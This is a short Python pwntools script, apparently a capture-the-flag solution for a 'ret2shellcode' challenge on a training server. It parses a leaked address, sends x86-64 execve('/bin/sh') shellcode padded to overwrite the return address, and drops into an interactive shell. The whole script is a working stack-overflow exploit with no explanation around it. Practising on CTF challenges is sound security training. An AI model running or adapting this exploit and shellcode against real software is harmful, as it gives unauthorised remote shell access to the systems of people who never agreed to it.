from pwn import *

# conn = process('./challenge-ret2shellcode')
conn = remote('chal.sigpwny.com', 1377)

conn.recvuntil('located at ')
SHELLCODE_ADDR = int(conn.recvline()[:-2], 16)

# make exploit
exploit = b""
exploit += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
exploit += b"0" * (0x28 - len(exploit))
exploit += p64(SHELLCODE_ADDR)

# send exploit
conn.send(exploit)

# get shell
conn.interactive()